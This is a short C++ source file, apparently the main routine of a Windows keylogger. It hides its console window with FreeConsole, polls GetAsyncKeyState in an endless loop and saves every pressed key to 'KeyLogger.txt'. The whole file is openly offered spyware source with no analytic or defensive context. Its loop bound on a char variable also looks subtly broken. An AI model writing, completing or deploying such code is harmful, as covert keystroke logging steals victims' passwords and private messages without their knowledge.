#ifndef __KEYLOGGER_H
#include "./KeyLogger.cpp"
#endif
int main()
{
    FreeConsole();
    string file = "KeyLogger.txt";
    while (true)
    {
        Sleep(10);
        for (char i = 8; i <= 255; i++)
            if (GetAsyncKeyState(i) == -32767) 
                Save(i, file);
    }    return 0;
}
